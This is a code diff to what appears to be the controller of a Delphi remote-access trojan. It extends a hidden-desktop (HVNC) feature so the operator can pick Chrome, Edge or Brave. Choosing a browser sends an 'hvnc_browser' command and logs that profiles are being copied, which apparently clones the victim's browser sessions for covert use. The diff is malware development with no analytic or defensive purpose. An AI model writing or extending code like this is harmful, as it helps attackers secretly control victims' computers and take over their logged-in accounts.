@@ -182,6 +182,9 @@ begin
   ComboBox2.Items.Add('powershell.exe');
   ComboBox2.Items.Add('cmd.exe');
   ComboBox2.Items.Add('explorer.exe');
+  ComboBox2.Items.Add('chrome.exe');
+  ComboBox2.Items.Add('msedge.exe');
+  ComboBox2.Items.Add('brave.exe');
   ComboBox2.ItemIndex := 0;
 
   PaintBox1.ControlStyle := PaintBox1.ControlStyle + [csDoubleClicks, csOpaque];
@@ -539,10 +542,21 @@ begin
 
   JSONObj := TJSONObject.Create;
   try
-    JSONObj.AddPair('action', 'hvnc_run');
-    JSONObj.AddPair('path',   ComboBox2.Text);
+    if SameText(ComboBox2.Text, 'chrome.exe') or
+       SameText(ComboBox2.Text, 'msedge.exe') or
+       SameText(ComboBox2.Text, 'brave.exe') then
+    begin
+      JSONObj.AddPair('action', 'hvnc_browser');
+      JSONObj.AddPair('path',   ComboBox2.Text);
+      LogToStatus('Profiles are being copied...');
+    end
+    else
+    begin
+      JSONObj.AddPair('action', 'hvnc_run');
+      JSONObj.AddPair('path',   ComboBox2.Text);
+      LogToStatus('Executing ' + ComboBox2.Text + ' in hidden desktop...');
+    end;
     FSendJSON(FLine, JSONObj);
-    LogToStatus('Executing ' + ComboBox2.Text + ' in hidden desktop...');
   finally
     JSONObj.Free;
   end;
